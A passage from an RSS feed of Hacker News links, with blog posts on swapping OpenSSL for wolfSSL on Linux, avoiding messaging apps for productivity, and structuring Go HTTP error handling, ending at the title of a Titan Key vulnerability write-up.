cryptographic functions and it provides <em>Transport Layer Security</em> (<em>TLS</em>) and <em>Secure Sockets Layer</em> (<em>SSL</em>) protocols to applications.</p><p>According to the <em>Arch Linux</em> <a href="https://archlinux.org/packages/core/x86_64/openssl/">OpenSSL package</a>, <strong>355</strong> packages, out of the
<em>11523</em> available, depend on it. You can find it installed on any Unix system
(and on Windows too!).</p><p>It started in 1998 as a fork of <a href="https://en.wikipedia.org/wiki/SSLeay">SSLeay</a> and it has been in development since.
Two full-time developers work on it, as well as many volunteers.</p><p>Fast forward to 2014: a <em><a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a></em> had been issued regarding a high risk
vulnerability found in OpenSSL. It has been given the name <strong><a href="https://heartbleed.com/">Heartbleed</a></strong>,
because it has been found in the <em>TLS</em>/<em>DTLS</em> heartbeat extension (<a href="https://tools.ietf.org/html/rfc6520">RFC6520</a>).
This vulnerability allowed attackers to steal sensitive data, such as secret
keys, user names and passwords.</p><p>All the community turned to the OpenSSL project, weighting its implementation
and security policy. Heartbleed have been promptly fixed, but there could be new
vulnerabilities in the future, if security was not properly prioritized during
development.</p><p>At this point, OpenBSD’s folks forked OpenSSL and started a new project:
<a href="https://www.libressl.org/">LibreSSL</a>. It primary goals were to <strong>modernize the codebase and to improve
its security</strong>. This new project hasn’t been adopted by big distributions such
Ubuntu and Arch Linux; instead smaller distributions (at that time) replaced
OpenSSL with LibreSSL on their default configuration, such as Alpine and Void.</p><p>In the last years, LibreSSL have seen a decline in its usage. Alpine switched
back to OpenSSL (<a href="https://lists.alpinelinux.org/~alpine/devel/%3C20181011171746.4c01f758%40ncopa-desktop.copa.dup.pw%3E">link to the thread</a>). Many people and distributions are
considering doing the same, since OpenSSL got the improvement that LibreSSL
aimed for. And it’s still the <em>de facto standard</em> cryptographic library on Unix.</p><h2 id="why-replacing-openssl-now">Why replacing OpenSSL now?</h2><p>OpenSSL works fine, there is no denying that. Every software has <em>out of the box
support for it</em> so it costs no effort in term of additional mainteinance.
However, there are <strong>newer and lighter TLS and SSL implementations</strong>, which many
folks might prefer over the heavy OpenSSL’s one. I, too, prefer lightweight
libraries.</p><p>I am uninstalling LibreSSL on my systems, therefore this might be the perfect
time to experiment with something different. I have found an interesting (and
well done!) library called <em><strong><a href="https://wolfssl.com/">wolfSSL</a></strong></em> that claims to have an <em>OpenSSL
compatibility layer</em>. It also claims to be 20 times smaller than OpenSSL.</p><h2 id="installation">Installation</h2><p><strong>wolfSSL</strong> is a small C library; It uses <em>autotools</em> to build and <strong>CMake</strong>
support is being added (sigh!). Upon running <code>configure</code>, I am overwhelmed by
the quantity of compile options available.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/wolf-ssl-configure.jpg" alt=""><figcaption>some of the wolfSSL configure options</figcaption></figure><p>Fortunately, there is one comfy option which I’ve used
when compiling wolfSSL: <code>--enable-all</code>. It enables all options, including
the OpenSSL compatibility layer and leaves out the <em>SSL 3</em> protocol.</p><p>Upon completing the build and installation (which takes a couple of
minutes), a library <code>libwolfssl.so</code> will be installed into <code>/usr/lib</code>, as
well as a pkgconfig file (<code>wolfssl.pc</code>) and all the headers.</p><h2 id="out-of-the-box-support">Out of the box support</h2><p>Key applications provide support for different SSL implementations other than
OpenSSL. For example <em>curl</em> supports <em>mbedTLS</em>, <em>BearSSL</em> and our <strong>wolfSSL</strong>.
To compile <em>curl</em> using wolfSSL, we just need to add <code>--with-ssl=wolfssl</code> and
we’re done. I am aware of only two packages that have out of the box support
for wolfSSL and they are <em>curl</em> and <em><a href="https://gitlab.com/gnuwget/wget2">wget2</a></em> (not the legacy version!).</p><h2 id="openssl-compatibility">OpenSSL compatibility</h2><p><code>--enable-all</code> configure option enabled the OpenSSL compatibility layer.
To use this layer, according to the <a href="https://www.wolfssl.com/docs/wolfssl-manual/ch13/">documentation</a>, we need to link the wolfssl
library manually by adding <code>-lwolfssl</code> as link argument. We also need to
include the path <code>/usr/include/wolfssl</code> so that the OpenSSL headers in
<code>/usr/include/wolfssl/openssl</code> will be picked up.</p><p>This way both wolfSSL and OpenSSL can coexist on the same system and the latter
can be replaced on a per project basis. However, that’s not what we want since
want to replace OpenSSL at a system level.</p><p>Adding the link flag to each package on the system or patching one by one
is not an option as it would take too much time. Let’s instead apply some
workarounds.</p><p>First, we create a symlink for the headers:</p><div><pre><code data-lang="bash">$ sudo ln -sf /usr/include/wolfssl/openssl /usr/include/openssl
</code></pre></div><p>Then we create a symlink for each library. OpenSSL provides the following
libraries:</p><ul><li><code>libssl.so</code></li><li><code>libcrypto.so</code></li></ul><p>So we can run:</p><div><pre><code data-lang="bash">$ sudo ln -sf /usr/lib/libwolfssl.so /usr/lib/libssl.so
$ sudo ln -sf /usr/lib/libwolfssl.so /usr/lib/libcrypto.so
</code></pre></div><h3 id="fixing-pkg-config">Fixing pkg-config</h3><p>Some software rely on pkg-config for checking OpenSSL dependency since
it provides the following pkg-config files:</p><ul><li><code>libssl.pc</code></li><li><code>libcrypto.pc</code></li><li><code>openssl.pc</code></li></ul><p>My system doesn’t currently have either OpenSSL or LibreSSL installed, so any
attempt to include OpenSSL by using pkg-config will fail. We can fix this by
adding a pkg-config file in <code>/usr/lib/pkgconfig/openssl.pc</code>:</p><pre><code>prefix=/usr/x86_64-pc-linux-musl
includedir=${prefix}/include/wolfssl

Name: openssl
Description: wolfssl C library.
Version: 4.6.0
Requires: wolfssl
Cflags: -I${includedir}
</code></pre><p>Our pkg-config file will include the correct directory containing the OpenSSL
headers. It will also import cflags and link flags from the wolfssl pkg-config.
Let’s try if it works as intended:</p><div><pre><code data-lang="bash">$ pkg-config --cflags --libs openssl
-I/usr/x86_64-pc-linux-musl/include/wolfssl -lwolfssl
</code></pre></div><p>Yes! Now we just need create symlinks the other two pkg-config files:</p><div><pre><code data-lang="bash">$ sudo ln -sf /usr/lib/pkgconfig/openssl.pc /usr/lib/pkgconfig/libssl.pc
$ sudo ln -sf /usr/lib/pkgconfig/openssl.pc /usr/lib/pkgconfig/libcrypto.pc
</code></pre></div><p>Now we’re ready to compile system packages.</p><h2 id="compiling-system-packages">Compiling system packages</h2><p>Before actually going further into the various compile results, there are few
general changes that I’ve done:</p><ol><li>Include the default <code>/usr/include/wolfssl/option.h</code> provided in
<code>/usr/include/wolfssl/wolfcrypt/setting.h</code>. This way we will have a bunch of
defines already included that enable many wolfSSL features.</li><li>Remove some defines from <code>option.h</code> that disable old OpenSSL features, like
old SSL names. While I understand that these features are plainly old (or even
deprecated), projects will still use them as long as they haven’t been
removed upstream.</li><li>Define <code>OPENSSL_NO_WHIRPOOL</code> in the same header as above, since this feature
ins’t implemented in wolfSSL. There are other <code>OPENSSL_NO_*</code> defines there for
unimplemented features, but this one was missing.</li></ol><h3 id="wget">wget</h3><p><em><a href="https://www.gnu.org/software/wget/">wget</a></em>, which comes installed on any Unix system, is the first software we’ll
try building with wolfSSL and its OpenSSL compatibility layer.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/wget-error-1.jpg" alt=""><figcaption>wget compile error</figcaption></figure><p>wget complains about two undeclared identifiers:</p><ul><li><code>CONF_MFLAGS_DEFAULT_SECTION</code></li><li><code>CONF_MFLAGS_IGNORE_MISSING_FILE</code></li></ul><p>We can fix this by adding the defines from the OpenSSL file <code>openssl/conf.h</code>
to <code>/usr/include/wolfssl/option.h</code>:</p><div><pre><code data-lang="c"><span># define CONF_MFLAGS_IGNORE_MISSING_FILE 0x10
</span><span># define CONF_MFLAGS_DEFAULT_SECTION     0x20
</span></code></pre></div><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/wget-error-2.jpg" alt=""><figcaption>wget link-time errors about missing symbols</figcaption></figure><p>We arrived at link-time, that’s huge! However, there are 8 undefined symbols:
6 symbols about unimplemented features in wolfSSL, such as <code>i2d_x509_PUBKEY</code>
and <code>a2i_IPADDRESS</code>; 2 symbols regarding wolfSSL functions. The latter could
probably be fixed by adding the proper compile time option to wolfSSL, like
<code>--enable-sslv3</code>.</p><h3 id="rhash">rhash</h3><p>rhash is an utility that calculates and verifies message digests, such as
<em>SHA256</em> and <em>MD5</em>. It is required by CMake, so we can consider it an essential
package. Compiling rhash led to many errors. Let’s look in depth at some of
them.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/rhash-error-1.jpg" alt=""><figcaption>rhash compile error about RIPEMD160_CTX</figcaption></figure><p><em>rhash</em> uses <code>RIPEMD160_CTX</code> which is not implemented by wolfSSL.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/rhash-error-2.jpg" alt=""><figcaption>rhash compile error about WOLFSSL_MD5_CTX</figcaption></figure><p>This time, rhash access a member of <code>MD5_CTX</code> (which wolfSSL has replaced by
<code>WOLFSSL_MD5_CTX</code>) using <code>offsetof</code>. The original <code>MD5_CTX</code> struct looks like
this:</p><div><pre><code data-lang="c"><span>typedef</span> <span>struct</span> <span>MD5state_st</span> <span>{</span>
    <span>MD5_LONG</span> <span>A</span><span>,</span> <span>B</span><span>,</span> <span>C</span><span>,</span> <span>D</span><span>;</span>
    <span>MD5_LONG</span> <span>Nl</span><span>,</span> <span>Nh</span><span>;</span>
    <span>MD5_LONG</span> <span>data</span><span>[</span><span>MD5_LBLOCK</span><span>];</span>
    <span>unsigned</span> <span>int</span> <span>num</span><span>;</span>
<span>}</span> <span>MD5_CTX</span><span>;</span>
</code></pre></div><p><code>WOLFSSL_MD5_CTX</code> instead looks like this:</p><div><pre><code data-lang="c"><span>typedef</span> <span>struct</span> <span>WOLFSSL_MD5_CTX</span> <span>{</span>
    <span>/* big enough to hold wolfcrypt md5, but check on init */</span>
<span>#ifdef STM32_HASH
</span><span></span>    <span>void</span><span>*</span> <span>holder</span><span>[(</span><span>112</span> <span>+</span> <span>WC_ASYNC_DEV_SIZE</span> <span>+</span> <span>sizeof</span><span>(</span><span>STM32_HASH_Context</span><span>))</span> <span>/</span> <span>sizeof</span><span>(</span><span>void</span><span>*</span><span>)];</span>
<span>#else
</span><span></span>    <span>void</span><span>*</span> <span>holder</span><span>[(</span><span>112</span> <span>+</span> <span>WC_ASYNC_DEV_SIZE</span><span>)</span> <span>/</span> <span>sizeof</span><span>(</span><span>void</span><span>*</span><span>)];</span>
<span>#endif
</span><span></span><span>}</span> <span>WOLFSSL_MD5_CTX</span><span>;</span>
</code></pre></div><p>I think that this incosistency between OpenSSL and wolfSSL structs <em>will</em>
happen again with different data types.</p><h3 id="libssh2">libssh2</h3><p>From the official <a href="https://www.libssh2.org/">libssh2</a> site:</p><blockquote><p><em>libssh2 a client-side C library implementing the SSH2 protocol</em></p></blockquote><p>curl has a hard dependency on libssh2, so we can consider it another essential
package.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/libssh2-error-1.jpg" alt=""><figcaption>libssh2 build errors</figcaption></figure><p>This time there are only 2 errors, both about unimplemented features:
<code>EVP_bf_cbc</code> and <code>EVP_cast5_cbc</code>. The man pages are the best source of
information about OpenSSL functions; we can browse them by running:</p><div><pre><code data-lang="bash">$ man EVP
$ man EVP_bf_cbc
$ man EVP_cast5_cbc
</code></pre></div><p>Let’s split the names and study each part:</p><ul><li><code>EVP</code> is a high-level interface to cryptographic functions</li><li><code>bf</code> and <code>cast5</code> are the name of the algorithms, <em><a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)">blowfish</a></em> and <em><a href="https://en.wikipedia.org/wiki/CAST-128">CAST</a></em>
respectively.</li><li><code>cbc</code>, <em><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#:~:text=Cipher%20block%20chaining%20(CBC),-CBC&amp;text=In%20CBC%20mode%2C%20each%20block,used%20in%20the%20first%20block.">Cipher Block Chaining</a></em>, is a mode of operation that tells OpenSSL
to operate on each block seperately from the others.</li></ul><p>Operating cryptographic functions in <em>CBC</em> mode isn’t really safe nor the
two algorithms above are really popular, so I understand why wolfSSL developers
might have prioritized other things over implementing the two functions above.</p><h3 id="ffmpeg">ffmpeg</h3><p><em><a href="https://ffmpeg.org/">ffmpeg</a></em> is a powerful library and a collection of utilities for handling
images, audio and videos. It is required by <em>Firefox</em>, <em>Chromium</em>, <em>mpv</em> and
another hundred and a half software (at least). We surely don’t want a system
without this library.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/ffmpeg-error.jpg" alt=""><figcaption>ffmpeg build error</figcaption></figure><p>This time there is only one error (but others may still pop up later while
building!). The function <code>BN_sub_word</code> is missing. According to the man pages,
it is the arithmetic function that perform subtractions on big integers.
This seems pretty straightforward …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/">https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/</a></em></p>]]>
            </description>
            <link>https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25676671</guid>
            <pubDate>Thu, 07 Jan 2021 20:11:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Things Done]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25676428">thread link</a>) | @cyb_
<br/>
January 7, 2021 | https://raccoon.onyxbits.de/blog/secret-getting-things-done/ | <a href="https://web.archive.org/web/*/https://raccoon.onyxbits.de/blog/secret-getting-things-done/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Ok, I am running an open source project here. What’s my workload? Short summary:</p>

<ul>
<li>Operate a server (no, <a href="https://raccoon.onyxbits.de/blog/why-not-use-github">hosting on GitHub is not an option</a>)</li>
<li>Blogging (it’s a self promotion thing, don’t ask).</li>
<li>Actual software development (researching Google Play, writing code, writing docs)</li>
<li>Dealing with the “fun” side of running a business (aka the legal shit).</li>
</ul>

<p>How do I manage to find time for all of this? <a href="https://francescocirillo.com/pages/pomodoro-technique">Pomodoro Technique</a>? Nah, much easier: good old blasphemy!</p>

<h2 id="blasphemy">Blasphemy?!</h2>

<p>Yep! I just refuse to use any kind of messenger. I don’t do Slack, Skype, Twitter, Facebook or whatever’s the hot shit right now. I won’t even answer the phone, unless it’s a scheduled call. The only way to communicate with me is either in person or via email. For me, it’s a simple rule of life: if it allows you to ring me up, then you can’t reach me through it.</p><figure>
  <a href="https://raccoon.onyxbits.de/blog/secret-getting-things-done/callbell.jpeg">
    <img src="https://raccoon.onyxbits.de/blog/secret-getting-things-done/callbell.jpeg">
  </a>
  
  <figcaption>Think: messenger app</figcaption>
  
</figure>
                             
                             

<p><i>… dafuq?!</i></p>

<p>Told you, it was blasphemy.</p>

<p>Here’s the thing: the mind needs about half an hour to enter “the zone”, the state in which creative work can happen and it only takes a short distraction to drop out of it again. We are living in this strange, hyper connected world, in which most of us have this funny idea in their head that we should have things that go “beep” in order to alert us to “important” things, that need to be taken care of right away (as if the one thing we are currently working on wasn’t important). I don’t agree. In my book, everything that is able to draw attention is by definition a distraction and therefore a productivity killer, not a productivity tool. By switching to “email only”, I avoid the problem. Plain and simple.</p>

<p>When I’m busy typing out a thought. Be it a blog post, a piece of code or even a reply to an email, then there’s no way in hell, I’d allow anyone to interrupt me to take care of whatever they think needs to be taken care instead. People can wait. No cutting in line. I will always finish a train of thought first and only then check my mail folder to see if something <strong>important</strong> came up in the meantime. <u>Paid work</u> is prioritized, everything else gets postponed till I can make time for it. If stuff piles up, so be it. If something (eventually) falls off the pile, even better. I don’t loose sleep over missing deadlines for anything that’s optional.</p>

<p>And that, quite unspectacularly, is how I get things done. I simply don’t buy into the modern belief of being on call <sup>24</sup>⁄<sub>7</sub>. <abbr title="Fear Of Loosing Out">FOMO</abbr> my ass. I chose when to handle things, not someone else.</p>
</div></div>]]>
            </description>
            <link>https://raccoon.onyxbits.de/blog/secret-getting-things-done/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25676428</guid>
            <pubDate>Thu, 07 Jan 2021 19:56:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elegancy of Go's Error Handling]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25676097">thread link</a>) | @vhakulinen
<br/>
January 7, 2021 | https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/ | <a href="https://web.archive.org/web/*/https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>Every so often, go’s error handling pops up in various forums and everyone seems
to have an opinion about it. Some say they should be more like throwable
exceptions, others prefer sum types like rust’s <code>Result&lt;T, E&gt;</code>. While I’ve gone
with the sum type <a href="https://dev.to/duunitori/mimicing-rust-s-result-type-in-typescript-3pn1">approach in typescript</a>,
I still like the way go handles errors.</p>
<p>That said, figuring out how to <em>really</em> handle errors can take some time (with
or without sum types/exceptions). In this post, I’ll be walking through one
approach on handling errors in go’s <code>http.Handler</code>.</p>

<p>The error values can be frustrating if you expect them to scale out “just like
that” without repeating themselves. Usual example goes something like this:</p>
<div><pre><code data-lang="golang"><span>func</span> copyfile(src, dst) <span>error</span> {
	fsrc, err := os.Open(src)
	<span>if</span> err != <span>nil</span> {
		<span>return</span> err
	}
	<span>defer</span> fsrc.Close()

	fdst, err := os.Open(src)
	<span>if</span> err != <span>nil</span> {
		<span>return</span> err
	}
	<span>defer</span> fdst.Close()

	err := io.Copy(fdst, fsrc)

	<span>return</span> err
}
</code></pre></div><p>Thats not so bad, and I’m quite sure that most of you have seen example like
that before. But let’s take a look at similar situation that might occur in a
<code>http.Hanlder</code>:</p>
<div><pre><code data-lang="golang"><span>func</span> handleThing(w http.ResponseWriter, r *http.Request) {
	<span>// Our path is something like /thing/3
</span><span></span>	id, err := idFromPath(r.URL.Path)
	<span>if</span> err != <span>nil</span> {
		http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusNotFound)
		<span>return</span>
	}

	thing, err := store.GetThingByID(id)
	<span>if</span> err != <span>nil</span> {
		<span>// The error might be sql.NoRows, or it might be something else.
</span><span></span>		<span>if</span> store.IsNotFoundErr(err) {
			http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
			<span>return</span>
		}
		log.Printf(<span>"Failed to get a thing: %v"</span>, err)
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		<span>return</span>
	}

	acc := AccountFromRequest(r)
	<span>if</span> acc == <span>nil</span> {
		<span>// No account attached to the request's session -&gt; permission denied.
</span><span></span>		http.Error(w, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		<span>return</span>
	}

	has, err := thing.HasPermissionToView(acc)
	<span>if</span> err != <span>nil</span> {
		<span>// For some reason, we failed to check permissions. Better log it.
</span><span></span>		log.Printf(<span>"Failed to check permissions: %v"</span>, err)
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		<span>return</span>
	}

	<span>if</span> !has {
		<span>// Permission denied.
</span><span></span>		http.Error(w, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		<span>return</span>
	}

	<span>// All good, send data to the client.
</span><span></span>	respond(w, r, decodeThing(thing))
}
</code></pre></div><p>Theres some functions that you’ll have to imagine is defined somewhere, but the
functionality is this:</p>
<ul>
<li>Extract ID from URL</li>
<li>Use that ID to get the thing from database</li>
<li>Check if the client has permission to view the thing</li>
<li>Give the thing to the client</li>
</ul>
<p>This functionality probably repeats itself for other resource types, so it gets
repetitive quite fast. Imagine doing the same for resources like foo, bar,
account and so on! Same functionality can be written in Django like this:</p>
<div><pre><code data-lang="python"><span>def</span> handle_thing(request):
    id = id_or_bad_request(request)
    thing = thing_or_404(id)

    account = account_or_forbidden(request)

    <span>if</span> <span>not</span> thing.has_permission(account):
        <span>raise</span> Forbidden()

    <span>return</span> JsonResponse(...)
</code></pre></div><p>Now that’s quite a lot simpler, thanks to throwable errors and how they
can be used to disrupt the code’s flow. <code>id_or_bad_request</code>, <code>thing_or_404</code> and
<code>account_or_forbidden</code> all throw an error that someone catches somewhere higher
and does the appropriate thing, like respond with correct status code and log
any errors.</p>

<p>Keeping that python code in mind, let’s think what we could do in our go code to
get it a bit more terse:</p>
<ul>
<li>When an error occurs, we just want to “throw” it somewhere. It usually is a
client error, but not always. Perhaps someone else can figure that out?</li>
<li>If a non client error occurs, it needs to be logged somewhere</li>
<li>Someone else should be able figure out the <code>http.Error</code> calls</li>
</ul>
<p>Golang’s <a href="https://blog.golang.org/error-handling-and-go">error handling and Go</a>
talks a bit about error handling in your http handlers and gives the following
example:</p>
<div><pre><code data-lang="golang"><span>func</span> viewRecord(w http.ResponseWriter, r *http.Request) <span>error</span> {
    c := appengine.NewContext(r)
    key := datastore.NewKey(c, <span>"Record"</span>, r.FormValue(<span>"id"</span>), 0, <span>nil</span>)
    record := new(Record)
    <span>if</span> err := datastore.Get(c, key, record); err != <span>nil</span> {
        <span>return</span> err
    }
    <span>return</span> viewTemplate.Execute(w, record)
}

<span>// NOTE: the following is my adapted version from the example's ServeHTTP to a
</span><span>// middleware/wrapper
</span><span></span>
<span>type</span> HandlerE = <span>func</span>(w http.ResponseWriter, r *http.Request) <span>error</span>

<span>func</span> WithError(h HandlerE) http.HandlerFunc {
	<span>return</span> <span>func</span>(w http.ResponseWriter, r *http.Request) {
		<span>if</span> err := h(w, r); err != <span>nil</span> {
			http.Error(w, err.Error(), 500)
		}
	}
}
</code></pre></div><p>That already solves one of our problems, which is the <code>http.Error</code> call. But
sometimes we don’t want to expose detailed errors to the client, so I would
replace the actual message with just a generic internal server error message.
Also, logging the reasons for internal server errors is important, so that you
can figure out what went wrong.</p>

<p>We want to return an error from our <em>actual</em> <code>http.Handler</code>, but somehow
instruct the <code>WithError</code> wrapper function to respond correctly to the client
when it gets an error, and on some errors log the errors. Something like this:</p>
<div><pre><code data-lang="golang"><span>func</span> WithError(h HandlerE) http.HandlerFunc {
	<span>return</span> <span>func</span>(w http.ResponseWriter, r *http.Request) {
		<span>if</span> err := h(w, r); err != <span>nil</span> {

			<span>if</span> is404err(err) {
				http.Error(w, <span>"not found"</span>, 404)
				<span>return</span>
			}

			<span>if</span> isBadRequest(err) {
				http.Error(w, <span>"bad request"</span>, 400)
				<span>return</span>
			}

			<span>// Some other special cases...
</span><span></span>			<span>// ...
</span><span></span>
			log.Printf(<span>"Something went wrong: %v"</span>, err)

			http.Error(w, <span>"Internal server error"</span>, 500)
		}
	}
}
</code></pre></div><p>Hmm, those “other special” cases might come and go and might get quite specific
for some handlers. Also, we’d still need to write those <code>is404err</code> and
<code>isBadRequest</code> handlers and whatever will follow. We can do much better with an
interface:</p>
<div><pre><code data-lang="golang"><span>type</span> ErrorResponder <span>interface</span> {
    <span>// RespondError writes an error message to w. If it doesn't know what to
</span><span></span>    <span>// respond, it returns false.
</span><span></span>	RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span>
}
</code></pre></div><p>With this interface we can do quite powerful things. Our <code>WithError</code> turns into
this:</p>
<div><pre><code data-lang="fallback">
func WithError(h HandlerE) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if err := h(w, r); err != nil {
			if er, ok := err.(ErrorResponder); ok {
				if er.RespondError(w, r) {
					return
				}
			}

			log.Printf("Something went wrong: %v", err)

			http.Error(w, "Internal server error", 500)
		}
	}
}
</code></pre></div><p>Notice how our special cases just disappeared? They are now just another
implementation(s) of <code>ErrorResponder</code>. This is what would our <code>Not found</code> and <code>Bad request</code> errors now looks like:</p>
<div><pre><code data-lang="golang">
<span>// BadRequest error responds with bad request status code, and optionally with
</span><span>// a json body.
</span><span></span><span>type</span> BadRequestError <span>struct</span> {
	err  <span>error</span>
	body <span>interface</span>{}
}

<span>func</span> BadRequest(err <span>error</span>) *BadRequestError {
	<span>return</span> &amp;BadRequestError{err: err}
}

<span>func</span> BadRequestWithBody(body <span>interface</span>{}) *BadRequestError {
	<span>return</span> &amp;BadRequestError{body: body}
}

<span>func</span> (e *BadRequestError) RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span> {
	<span>if</span> e.body == <span>nil</span> {
		http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
	} <span>else</span> {
		w.WriteHeader(http.StatusBadRequest)

		w.Header().Set(<span>"Content-Type"</span>, <span>"application/json"</span>)
		err := json.NewEncoder(w).Encode(e.body)

		<span>if</span> err != <span>nil</span> {
			log.Printf(<span>"Failed to encode a response: %v"</span>, err)
		}
	}

	<span>return</span> <span>true</span>
}

<span>func</span> (e *BadRequestError) Error() <span>string</span> {
	<span>return</span> e.err.Error()
}

<span>// Maybe404Error responds with not found status code, if its supplied error
</span><span>// is sql.ErrNoRows.
</span><span></span><span>type</span> Maybe404Error <span>struct</span> {
	err <span>error</span>
}

<span>func</span> Maybe404(err <span>error</span>) *Maybe404Error {
	<span>return</span> &amp;Maybe404Error{err: err}
}

<span>func</span> (e *Maybe404Error) Error() <span>string</span> {
	<span>return</span> fmt.Sprintf(<span>"Maybe404: %v"</span>, e.err.Error())
}

<span>func</span> (e *Maybe404Error) Is404() <span>bool</span> {
	<span>return</span> errors.Is(e.err, sql.ErrNoRows)
}

<span>func</span> (e *Maybe404Error) RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span> {
	<span>if</span> !e.Is404() {
		<span>return</span> <span>false</span>
	}

	http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
	<span>return</span> <span>true</span>
}
</code></pre></div><p>You could easily write more <code>ErrorResponder</code>s for permission denied errors and
much more.</p>

<p>With <code>ErrorResponder</code> and <code>WithError</code>, we can reduce our earlier <code>handleThing</code>
handler into this:</p>
<div><pre><code data-lang="golang"><span>func</span> handleThing(w http.ResponseWriter, r *http.Request) <span>error</span> {
	<span>// Our path is something like /thing/3
</span><span></span>	id, err := idFromPath(r.URL.Path)
	<span>if</span> err != <span>nil</span> {
		<span>// Literally bad request. We could use BadRequestWithBody to
</span><span></span>		<span>// respond with a fancy information for the client.
</span><span></span>		<span>return</span> BadRequest(err)
	}

	thing, err := store.GetThingByID(id)
	<span>if</span> err != <span>nil</span> {
		<span>// Likely a not found issue, but something else might have gone wrong.
</span><span></span>		<span>// Maybe404Error handles both cases.
</span><span></span>		<span>return</span> Maybe404(err)
	}

	acc := AccountFromRequest(r)
	<span>if</span> acc == <span>nil</span> {
		<span>// No account attached to the request. Client needs to authenticate.
</span><span></span>		<span>return</span> AuthenticationRequired()
	}

	has, err := thing.HasPermissionToView(acc)
	<span>if</span> err != <span>nil</span> {
		<span>// Something actually went wrong. Error will be logged and 500 message
</span><span></span>		<span>// sent to the client.
</span><span></span>		<span>return</span> err
	}

	<span>if</span> !has {
		<span>// Client doesn't have permission to view this resource.
</span><span></span>		<span>return</span> PermissionDenied()
	}

	<span>// All good, send data to the client.
</span><span></span>	respond(w, r, decodeThing(thing))
}

<span>func</span> main() {
	...
	mux.Handle(<span>"/thing/"</span>, WithError(handleThing))
	...
}
</code></pre></div><p>Thats a lot better! I’ll leave it as an exercise to the reader to combine the
auth and permission checking. Another exercise is to do a bit better logging
than just “Something went wrong: <em>error</em>” in the WithError function. Perhaps log
the path and requester, or use trace ids?</p>
<p>With all this, we can now:</p>
<ul>
<li>“throw” errors somewhere</li>
<li>Someone else is figuring out the <code>http.Error</code> calls</li>
<li>Non client errors are logged</li>
</ul>

<p>Sometimes I’m amazed just by how simple (yet powerful) go’s error type is. Other
times I’m banging my head against the wall because I can’t figure out how to use
that simplicity. The solution presented in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/">https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/</a></em></p>]]>
            </description>
            <link>https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25676097</guid>
            <pubDate>Thu, 07 Jan 2021 19:35:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will Trump complete his first term?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25675949">thread link</a>) | @donut2d
<br/>
January 7, 2021 | https://polymarket.com/market/will-trump-complete-his-first-term | <a href="https://web.archive.org/web/*/https://polymarket.com/market/will-trump-complete-his-first-term">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://polymarket.com/market/will-trump-complete-his-first-term</link>
            <guid isPermaLink="false">hacker-news-small-sites-25675949</guid>
            <pubDate>Thu, 07 Jan 2021 19:25:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CVE-2021-3011: Key recovery on Google Titan Key]]>
            </title>
            <description>
<![CDATA[
Score 233 | Comments 78 (<a href="https://news.ycombinator.com/item?id=25675556">thread link</a>) | @hexa-
<br/>
January 7, 2021 | https://ninjalab.io/a-side-journey-to-titan/ | <a href="https://web.archive.org/web/*/https://ninjalab.io/a-side-journey-to-titan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
					<div>
							<section id="blog">
				<article id="post-747" class="page">
		<div>
		
<center><h3> <a href="https://ninjalab.io/wp-content/uploads/2021/01/a_side_journey_to_titan.pdf" target="_blank" rel="noopener noreferrer">Download the Writeup<center><img src="https://ninjalab.io/wp-content/uploads/2021/01/Titan_Bluetooth_EM_probe.png"></center>
</a></h3></center><br>

<h3>Abstract</h3>
